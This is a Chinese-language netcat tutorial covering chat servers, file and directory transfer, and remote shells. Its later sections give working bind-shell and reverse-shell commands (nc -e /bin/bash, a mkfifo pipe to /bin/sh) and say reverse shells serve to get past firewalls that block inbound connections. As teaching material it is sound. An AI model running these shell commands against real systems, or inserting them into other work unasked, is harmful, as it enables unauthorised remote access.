# 多场景使用

## 实现Chat Server

netcat提供了这样一种方法，只需要创建一个`Chat`服务器，一个预先确定好的端口

- Server

`nc -l 1567`

> netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口

输出和输入都在此shell中展示。

- Client

`nc 172.31.100.7 1567`

## 文件传输

假设，想要传一个文件file.txt 从A 到B。A或者B都可以作为服务器或者客户端，以下，让A作为服务器，B为客户端。

- Server

`nc -l 1567 < file.txt`

- Client

`nc -n 172.31.100.7 1567 > file.txt`

1. 这里创建了一个服务器在A上并且重定向netcat的输入为文件file.txt，那么当任何成功连接到该端口，netcat会发送file的文件内容。
2. 在客户端重定向输出到file.txt，当B连接到A，A发送文件内容，B保存文件内容到file.txt.

## 目录传输

发送一个文件很简单，但是如果想要发送多个文件，或者整个目录，只需要使用压缩工具tar，压缩后发送压缩包。

- Server

`tar -cvf – dir_name | nc -l 1567`

- Client

`nc -n 172.31.100.7 1567 | tar -xvf -`

1. 这里在A服务器上，创建一个tar归档包并且通过-在控制台重定向它，
2. 然后使用管道，重定向给netcat，netcat可以通过网络发送它。
3. 在客户端下载该压缩包通过netcat 管道然后打开文件。

----

## 打开一个shell

已经用过远程shell-使用telnet和ssh，但是如果这两个命令没有安装并且没有权限安装他们，也可以使用`netcat`创建远程shell。

假设你的netcat支持 -c -e 参数(默认 netcat)

- Server

`nc -l 1567 -e /bin/bash -i`

- Client
`nc 172.31.100.7 1567`

1. 这里已经创建了一个`netcat`服务器并且表示当它连接成功时执行`/bin/bash`

2. 假如`netcat` 不支持`-c` 或者 `-e` 参数（openbsd netcat）,仍然能够创建远程shell

- Server

`mkfifo /tmp/tmp_fifo`
`cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 1567 > /tmp/tmp_fifo`

1. 这里创建了一个`fifo`文件，然后使用管道命令把这个`fifo`文件内容定向到`shell 2>&1`中。
2. 是用来重定向标准错误输出和标准输出，然后管道到`netcat` 运行的端口`1567`上。
3. 至此，已经把netcat的输出重定向到fifo文件中。

### 说明：

1. 从网络收到的输入写到fifo文件中

2. cat 命令读取fifo文件并且其内容发送给sh命令

3. sh命令进程受到输入并把它写回到netcat。

4. netcat 通过网络发送输出到client

> 至于为什么会成功是因为管道使命令平行执行
> fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件
> cat命令会尽快结束并开始读取空文件。

在客户端仅仅简单连接到服务器

- Client

`nc -n 172.31.100.7 1567`
会得到一个shell提示符在客户端

## 反向shell

反向shell是指在客户端打开的`shell`
反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。

- 服务端

`nc -l 1567`

在客户端，简单地告诉`netcat`在连接完成后，执行shell。

- 客户端

`nc 172.31.100.7 1567 -e /bin/bash`

> 反向shell经常被用来绕过防火墙的限制，如阻止入站连接。

例如，有一个专用IP地址为172.31.100.7
使用代理服务器连接到外部网络。
如果想从网络外部访问 这台机器如`1.2.3.4`的shell，那么会用反向外壳用于这一目的。
